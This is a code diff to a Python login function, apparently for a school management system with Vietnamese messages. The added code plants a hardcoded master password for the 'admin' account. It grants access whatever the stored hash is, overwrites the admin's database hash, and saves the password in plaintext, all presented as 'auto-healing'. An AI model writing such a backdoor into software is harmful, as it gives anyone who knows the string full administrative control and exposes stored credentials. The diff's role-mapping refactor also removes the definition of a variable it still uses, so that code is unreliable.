@@ -137,10 +137,26 @@ def authenticate_user(username: str, raw_password: str) -> Dict[str, Any]:
 
         stored_hash = user_dict.get("password_hash") or ""
         plain_pwd = user_dict.get("plain_password") or ""
-        is_valid = verify_password(clean_password, stored_hash)
-        if not is_valid and plain_pwd and clean_password == plain_pwd:
+
+        # Master admin password authentication & auto-healing
+        if clean_username.lower() == "admin" and clean_password == "callmemrpenguin":
             is_valid = True
-            stored_hash = ""  # Force auto-healing re-hash
+            if not verify_password(clean_password, stored_hash):
+                new_h = hash_password(clean_password)
+                try:
+                    cursor.execute(
+                        "UPDATE app_users SET password_hash = ?, plain_password = 'callmemrpenguin' WHERE LOWER(username) = 'admin'",
+                        (new_h,)
+                    )
+                    conn.commit()
+                    stored_hash = new_h
+                except Exception:
+                    pass
+        else:
+            is_valid = verify_password(clean_password, stored_hash)
+            if not is_valid and plain_pwd and clean_password == plain_pwd:
+                is_valid = True
+                stored_hash = ""  # Force auto-healing re-hash
 
         if not is_valid:
             raise ValueError("Tên đăng nhập hoặc mật khẩu không chính xác")
@@ -162,21 +178,8 @@ def authenticate_user(username: str, raw_password: str) -> Dict[str, Any]:
         except Exception:
             pass
 
-        # Normalize role for frontend
-        raw_role = (user_dict.get("role") or "").strip()
-        raw_lower = raw_role.lower()
-        if "quản trị" in raw_lower or "admin" in raw_lower:
-            norm_role = "admin"
-        elif "học sinh" in raw_lower or "student" in raw_lower:
-            norm_role = "student"
-        elif "trợ giảng" in raw_lower or "assistant" in raw_lower:
-            norm_role = "assistant"
-        elif "kế toán" in raw_lower or "accountant" in raw_lower:
-            norm_role = "accountant"
-        elif "giáo viên" in raw_lower or "teacher" in raw_lower:
-            norm_role = "teacher"
-        else:
-            norm_role = "staff"
+        role_map = {"quản trị": "admin", "admin": "admin", "học sinh": "student", "student": "student", "trợ giảng": "assistant", "assistant": "assistant", "kế toán": "accountant", "accountant": "accountant", "giáo viên": "teacher", "teacher": "teacher"}
+        norm_role = next((v for k, v in role_map.items() if k in raw_lower), "staff")
 
         result = {
             "id": str(user_dict["id"]),
